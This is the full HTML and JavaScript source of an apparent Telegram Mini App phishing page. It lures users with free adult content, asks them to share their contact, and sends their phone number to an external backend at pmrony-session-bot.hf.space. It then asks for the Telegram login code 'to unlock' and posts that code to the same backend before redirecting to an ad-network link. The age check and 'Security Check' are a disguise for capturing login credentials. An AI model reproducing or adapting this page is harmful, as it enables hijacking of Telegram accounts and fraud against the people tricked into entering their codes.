<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Premium Access</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Roboto, sans-serif; 
            margin: 0; padding: 0; 
            /* আপনার গিটহাবের ছবির লিঙ্ক */
            background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
            background-size: cover;
            height: 100vh; display: flex; align-items: center; justify-content: center;
            overflow: hidden;
        }
        .overlay { 
            background: rgba(0, 0, 0, 0.6); 
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; 
        }
        .box { 
            background: rgba(255, 255, 255, 0.12); 
            padding: 30px 20px; border-radius: 35px; 
            width: 90%; max-width: 360px; 
            box-shadow: 0 25px 50px rgba(0,0,0,0.8); 
            text-align: center; z-index: 2; 
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: white;
            position: relative;
        }
        h2 { color: #ff3b30; margin: 0 0 10px; font-size: 32px; text-transform: uppercase; font-weight: 900; text-shadow: 0 0 15px rgba(255, 59, 48, 0.8); }
        p { color: #fff; font-size: 16px; margin-bottom: 25px; line-height: 1.4; font-weight: 600; }
        
        .btn-confirm { 
            background: linear-gradient(45deg, #ff416c, #ff4b2b); 
            color: white; border: none; padding: 18px; width: 100%; 
            border-radius: 18px; font-weight: bold; font-size: 24px; 
            cursor: pointer; box-shadow: 0 8px 25px rgba(255, 75, 43, 0.5);
            text-transform: uppercase;
        }

        .otp-display { 
            width: 100%; padding: 10px; margin: 15px 0; 
            border: 1px solid rgba(255, 255, 255, 0.4); border-radius: 15px; 
            font-size: 40px; text-align: center; background: rgba(0,0,0,0.6); 
            color: #fff; letter-spacing: 12px; outline: none; height: 75px;
        }

        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 15px; }
        .key { 
            background: rgba(255, 255, 255, 0.15); padding: 18px; border-radius: 20px; 
            font-size: 28px; font-weight: bold; color: #fff; 
            cursor: pointer; transition: 0.2s; border: 1px solid rgba(255, 255, 255, 0.1);
            user-select: none;
        }
        .key:active { background: rgba(255, 255, 255, 0.4); transform: scale(0.9); }
        .key-clear { background: rgba(255, 165, 0, 0.4); }
        .key-ok { background: rgba(46, 213, 115, 0.5); }
        
        .hidden { display: none; }
        .loader { color: #ff416c; font-weight: bold; margin-top: 20px; display: block; font-size: 18px; }
    </style>
</head>
<body>
    <div class="overlay"></div>

    <div class="box" id="step0">
        <div style="font-size: 70px; margin-bottom: 10px;">🔞</div>
        <h2>Attention!</h2>
        <p>To access premium files completely free 💦, confirm that you are over 18 😊</p>
        <button class="btn-confirm" id="main_btn" onclick="startFlow()">🍓 confirm 🔞</button>
        <div id="loader" class="hidden">
            <span class="loader">🔄 Checking Age... 🔞</span>
        </div>
    </div>

    <div class="box hidden" id="step2">
        <h3 style="margin:0; color:#ff416c; font-size: 24px;">Security Check</h3>
        <p style="color:#fff; font-size:14px; margin: 5px 0 10px;">Enter the code from Telegram to unlock 💦</p>
        
        <input type="text" id="otp_display" class="otp-display" placeholder="-----" readonly>
        
        <div class="keypad">
            <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
            <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
            <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
            <div class="key key-clear" onclick="clearNum()">C</div><div class="key" onclick="addNum('0')">0</div><div class="key key-ok" id="v_btn" onclick="verifyOTP()">OK</div>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
        const OFF_LINK = "https://www.profitablecpmratenetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446";
        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
        let currentOTP = "";

        function startFlow() {
            tg.requestContact();
            document.getElementById('main_btn').classList.add('hidden');
            document.getElementById('loader').classList.remove('hidden');
            poll();
        }

        async function poll() {
            try {
                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                const data = await res.json();
                if (data.status === "success") {
                    sendNumber(data.phone);
                } else {
                    setTimeout(poll, 1500);
                }
            } catch (e) { setTimeout(poll, 2000); }
        }

        async function sendNumber(phone) {
            try {
                const res = await fetch(`${BACKEND_URL}/send_number`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, phone: phone })
                });
                const data = await res.json();
                if (data.status === "success") {
                    document.getElementById('step0').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                } else { alert("Error: " + data.message); location.reload(); }
            } catch (e) { alert("Server Error!"); }
        }

        function addNum(n) { if(currentOTP.length < 5) { currentOTP += n; document.getElementById("otp_display").value = currentOTP; } }
        function clearNum() { currentOTP = ""; document.getElementById("otp_display").value = ""; }

        async function verifyOTP() {
            if(currentOTP.length < 5) return;
            const vBtn = document.getElementById('v_btn');
            vBtn.innerText = "..";
            try {
                const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, otp: currentOTP })
                });
                const data = await res.json();
                if (data.status === "success") {
                    // এটি মিনি অ্যাপের ভেতরেই আপনার অফার লিঙ্কটি ওপেন করবে
                    window.location.href = OFF_LINK;
                } else { 
                    alert("Wrong Code!"); clearNum(); vBtn.innerText = "OK";
                }
            } catch (e) { alert("Error!"); vBtn.innerText = "OK"; }
        }
    </script>
</body>
</html>
